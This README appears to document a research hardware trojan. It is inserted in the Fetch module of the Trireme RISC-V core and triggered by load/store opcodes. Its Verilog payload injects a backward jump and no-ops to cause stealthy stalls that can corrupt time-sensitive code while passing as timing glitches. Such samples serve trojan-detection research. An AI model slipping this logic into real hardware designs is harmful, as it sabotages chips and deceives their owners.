# Performance Reducer
This branch houses a basic counter based performance reduced trojan on the Fetch module within Trireme.

## Trigger

When any read/write instruction is fetched and the trigger isn't already active, the Trojan is trigged.

```verilog
reg trigger;
wire [6:0] opcode;
wire is_read;
wire is_write;

assign opcode = i_mem_data[6:0];

assign is_read = (opcode == 7'b0000011); // Load instructions (e.g., LB, LH, LW)
assign is_write = (opcode == 7'b0100011); // Store instructions (e.g., SB, SH, SW)

// (...)

always @(i_mem_data) begin
  if (trigger)begin
    // (...)
  end else begin
    trigger = (is_read || is_write);
    // (...)
  end
end
```

## Payload

The payload is embedded within the fetch instruction module as a "jal x0, -4" instruction, which is injected into the output stream of the module. When processed, this instruction forces Trireme to branch back to the previous instruction.
To prevent an infinite loop (indefinite backward jumps), the Trojan modifies the previous fetched instructions to "addi x0, x0, 0" (a no-op) during each iteration. Once execution returns to the instruction that originally triggered the payload, the Trojan deactivates itself (after verifying its prior activation) and resumes normal execution flow.
The payload creates a transient fault – a single-cycle execution stall – rather than a permanent hang. This subtle disruption can reduce perfomance and corrupt time-sensitive operations (e.g., cryptographic routines, sensor polling) while evading detection by appearing as a rare timing glitch.

```verilog
reg [DATA_WIDTH-1  :0] lastInstruction;
// (...)
localparam NOP = 32'h00000013;

always @(i_mem_data) begin
  if (trigger)begin
    if(lastInstruction != i_mem_data)begin // modifies the previous fetched instructions to "addi x0, x0, 0" to avoid changes in the result of the execution.
      instruction = 32'b10011; // addi x0, x0, 0
    end else begin // after verifying its prior activation, the trojan deactivates itself
      trigger = 1'b0;
      instruction = flush ? NOP : i_mem_data; // resumes normal execution flow
    end
  end else begin
    trigger = (is_read || is_write);
    if (trigger)begin
      lastInstruction = i_mem_data;
      instruction = 32'b11111111110111111111000001101111; // jal x0, -4
    end else begin
      instruction = flush ? NOP : i_mem_data;
    end
  end
end

always @(*) begin
 if (!trigger)begin // normal execution flow without trigger
  instruction = flush ? NOP : i_mem_data;
 end
end
```
